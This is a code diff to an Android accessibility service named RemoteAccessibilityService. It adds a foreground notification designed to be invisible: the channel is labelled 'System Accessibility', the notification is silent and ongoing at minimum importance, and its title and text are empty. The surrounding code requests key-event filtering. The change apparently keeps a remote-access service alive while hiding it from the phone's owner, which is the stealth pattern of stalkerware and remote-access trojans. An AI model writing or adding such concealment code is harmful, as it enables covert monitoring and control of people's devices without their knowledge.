@@ -25,6 +25,33 @@ class RemoteAccessibilityService : AccessibilityService() {
         instance = this
         AccessibilityOverlayManager.removeOverlay(this)
         try {
+            val channelId = "accessibility_keepalive_channel"
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                val channel = android.app.NotificationChannel(
+                    channelId,
+                    "System Accessibility",
+                    android.app.NotificationManager.IMPORTANCE_MIN
+                ).apply {
+                    setShowBadge(false)
+                    setSound(null, null)
+                }
+                val notificationManager = getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                notificationManager.createNotificationChannel(channel)
+            }
+            val notification = androidx.core.app.NotificationCompat.Builder(this, channelId)
+                .setSmallIcon(android.R.drawable.ic_menu_info_details)
+                .setContentTitle("")
+                .setContentText("")
+                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
+                .setOngoing(true)
+                .setSilent(true)
+                .build()
+            startForeground(99921, notification)
+        } catch (e: Exception) {
+            android.util.Log.e("RemoteAccessibilityService", "Error starting foreground in Accessibility: ${e.message}")
+        }
+
+        try {
             val currentInfo = serviceInfo ?: AccessibilityServiceInfo()
             currentInfo.flags = currentInfo.flags or
                     AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
